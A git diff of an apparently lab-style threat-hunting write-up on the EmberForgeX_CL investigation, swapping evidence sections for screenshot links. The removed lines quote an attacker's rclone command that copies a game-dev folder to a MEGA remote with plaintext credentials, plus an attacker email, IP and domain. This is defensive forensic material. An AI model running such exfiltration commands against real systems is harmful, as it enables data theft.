@@ -44,7 +44,7 @@ EmberForgeX_CL
 
 ### Screenshot
 
-<img width="1014" height="325" alt="image" src="https://github.com/user-attachments/assets/3d01643f-35c4-4686-ace2-2c43c3da28a1" />
+<img width="854" height="268" alt="image" src="https://github.com/user-attachments/assets/1f0bca93-d1b6-4944-8554-a0d25c3c247c" />
 
 
 ---
@@ -60,21 +60,10 @@ EmberForgeX_CL
 | order by TimeGenerated asc
 ```
 
-## Evidence Identified
-
-```cmd
-cmd.exe /c "echo user = jwilson.vhr@proton.me>> C:\Users\Public\rclone.conf"
-```
-
-## Findings
-
-| Artifact       | Value                                                 |
-| -------------- | ----------------------------------------------------- |
-| Attacker Email | [jwilson.vhr@proton.me](mailto:jwilson.vhr@proton.me) |
-
 ### Screenshot
 
-(Add screenshot here)
+<img width="1074" height="339" alt="image" src="https://github.com/user-attachments/assets/2abbc38e-ec34-4f2a-a99a-8c0502e16897" />
+
 
 ---
 
@@ -89,22 +78,10 @@ EmberForgeX_CL
 | order by TimeGenerated asc
 ```
 
-## Evidence Identified
-
-```cmd
-C:\Users\Public\rclone.exe copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
-```
-
-## Findings
-
-| Artifact           | Value                                                 |
-| ------------------ | ----------------------------------------------------- |
-| Username           | [jwilson.vhr@proton.me](mailto:jwilson.vhr@proton.me) |
-| Plaintext Password | Summer2024!                                           |
-
 ### Screenshot
 
-(Add screenshot here)
+<img width="845" height="258" alt="image" src="https://github.com/user-attachments/assets/0e5cd08f-969b-4e31-9074-091412a99f1c" />
+
 
 ---
 
@@ -124,15 +101,10 @@ EmberForgeX_CL
 | order by TimeGenerated asc
 ```
 
-## Findings
-
-| Artifact       | Value         |
-| -------------- | ------------- |
-| Destination IP | 66.203.125.15 |
-
 ### Screenshot
 
-(Add screenshot here)
+<img width="838" height="252" alt="image" src="https://github.com/user-attachments/assets/abe621f1-41d0-42a0-b0ee-056721819e33" />
+
 
 ---
 
@@ -215,15 +187,11 @@ EmberForgeX_CL
 | order by count_ desc
 ```
 
-## Findings
-
-| Artifact        | Value                   |
-| --------------- | ----------------------- |
-| External Domain | sync.cloud-endpoint.net |
 
 ### Screenshot
 
-(Add screenshot here)
+<img width="876" height="277" alt="image" src="https://github.com/user-attachments/assets/d6d59adf-1c0f-4ae6-8a41-1e5da923bd81" />
+
 
 ---
 
